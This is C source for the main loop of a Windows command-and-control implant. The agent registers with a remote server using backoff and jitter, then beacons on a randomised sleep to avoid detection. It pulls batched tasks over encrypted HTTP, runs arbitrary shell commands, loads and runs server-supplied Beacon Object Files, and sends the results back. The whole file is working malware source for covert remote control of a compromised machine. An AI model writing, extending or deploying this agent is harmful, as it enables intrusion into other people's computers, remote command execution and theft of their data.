#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"
#include "core/package.h"
#include "crypto/ecdh.h"
#include "transport/http.h"
#include "modules/shell.h"

#define AGENT_ID_SIZE  256

static char g_agent_id[AGENT_ID_SIZE] = {0};

static int do_checkin(void) {
    uint8_t *resp = NULL;
    size_t   resp_len = 0;

    if (package_transmit_all(&resp, &resp_len) != 0 || !resp) {
        free(resp);
        return -1;
    }

    // Parse top‑level response package
    package_reader_t top_reader;
    package_reader_init(&top_reader, resp, resp_len);
    package_header_t top_hdr;
    if (!package_reader_parse_header(&top_reader, &top_hdr)) {
        // Not a package (probably an empty encrypted blob)
        free(resp);
        return 0;
    }

    if (top_hdr.flags & PKG_FLAG_BATCH) {
        // The reader's offset is now at the payload start.
        const uint8_t *batch = top_reader.data + top_reader.offset;
        size_t batch_len = resp_len - top_reader.offset;
        size_t off = 0;

        while (off + PACKAGE_HEADER_SIZE <= batch_len) {
            // Each sub‑package is a complete wire message.
            package_reader_t sub_reader;
            package_reader_init(&sub_reader, batch + off, batch_len - off);
            package_header_t sub_hdr;

            if (package_reader_parse_header(&sub_reader, &sub_hdr)) {
                // The sub‑reader is now positioned at the payload.
                switch (sub_hdr.command) {
                    case PKG_CMD_EXEC_SHELL: {
                        const char *cmd = NULL;
                        size_t cmd_len;
                        if (package_read_string(&sub_reader, &cmd, &cmd_len)) {
                            execute_shell_command(cmd);
                            int out_len = shell_output_len();
                            const char *out_buf = shell_output_buf();
                            ppackage_t out_pkg = package_create_with_request_id(
                                PKG_CMD_TASK_OUTPUT, sub_hdr.request_id);
                            if (out_pkg) {
                                package_add_string(out_pkg, out_len > 0 ? out_buf : "");
                                package_transmit(out_pkg);
                            }
                            shell_buf_reset();
                        }
                        break;
                    }
                    case PKG_CMD_BOF_EXECUTE: {
                        const char *name = NULL; size_t name_len;
                        const uint8_t *bof = NULL; size_t bof_len;
                        const char *args_hex = NULL; size_t args_len;

                        if (package_read_string(&sub_reader, &name, &name_len) &&
                            package_read_bytes(&sub_reader, &bof, &bof_len) &&
                            package_read_string(&sub_reader, &args_hex, &args_len))
                        {
                            int hex_len = (int)args_len;
                            int raw_len = hex_len / 2;
                            char *args = (char *)malloc(raw_len + 1);
                            if (args) {
                                for (int i = 0; i < raw_len; i++) {
                                    unsigned int b = 0;
                                    sscanf(args_hex + i * 2, "%2x", &b);
                                    args[i] = (char)b;
                                }
                                args[raw_len] = '\0';
                                execute_bof((unsigned char *)bof, (size_t)bof_len,
                                            args, raw_len);
                                free(args);
                            }
                            int out_len = shell_output_len();
                            const char *out_buf = shell_output_buf();
                            ppackage_t out_pkg = package_create_with_request_id(
                                PKG_CMD_BOF_OUTPUT, sub_hdr.request_id);
                            if (out_pkg) {
                                package_add_string(out_pkg, out_len > 0 ? out_buf : "");
                                package_transmit(out_pkg);
                            }
                            shell_buf_reset();
                        }
                        break;
                    }
                    case PKG_CMD_EXIT: {
                        shell_cleanup();
                        ExitProcess(0);
                        break;
                    }
                    default: break;
                }

                // Advance by the total wire size of the sub‑package
                // (length field value + 4 for the length field itself)
                uint32_t sub_len_field =
                    ((uint32_t)batch[off] << 24) |
                    ((uint32_t)batch[off+1] << 16) |
                    ((uint32_t)batch[off+2] << 8) |
                    (batch[off+3]);
                off += sub_len_field + 4;
            } else {
                // Malformed sub‑package; skip to end
                break;
            }
        }
    } else {
        // Not a batch — could handle a single task package here if needed.
    }

    free(resp);
    return 0;
}

int main(void) {
    char agent_id[AGENT_ID_SIZE] = {0};
    srand((unsigned int)GetTickCount());

    if (shell_init() != 0) {
        fprintf(stderr, "[!] shell_init failed\n");
        return 1;
    }

    int attempt = 0;
    while (do_register(agent_id, AGENT_ID_SIZE) != 0) {
        attempt++;
        int base_ms = 5000;
        for (int i = 1; i < attempt && i < 6; i++) base_ms *= 2;
        if (base_ms > 300000) base_ms = 300000;
        int jitter = rand() % (base_ms / 4 + 1);
        int sleep_ms = base_ms + jitter;
        fprintf(stderr, "[!] Registration failed (attempt %d), retrying in %d ms\n",
                attempt, sleep_ms);
        Sleep((DWORD)sleep_ms);
    }

    strncpy(g_agent_id, agent_id, AGENT_ID_SIZE - 1);
    g_agent_id[AGENT_ID_SIZE - 1] = '\0';
    package_set_agent_id(g_agent_id);

    // Initial checkin
    {
        int out_len = shell_output_len();
        const char *out_buf = shell_output_buf();
        if (out_len > 0) {
            ppackage_t pkg = package_create_with_metadata(PKG_CMD_CHECKIN);
            if (pkg) {
                package_add_string(pkg, out_buf);
                package_transmit(pkg);
            }
            shell_buf_reset();
        }
        do_checkin();
    }

    while (1) {
        do_checkin();
        int signed_sleep = (int)C2_SLEEP_BASE_MS
                         + (rand() % (int)(C2_SLEEP_JITTER_MS * 2))
                         - (int)C2_SLEEP_JITTER_MS;
        if (signed_sleep < 1000) signed_sleep = 1000;
        Sleep((DWORD)signed_sleep);
    }

    shell_cleanup();
    return 0;
}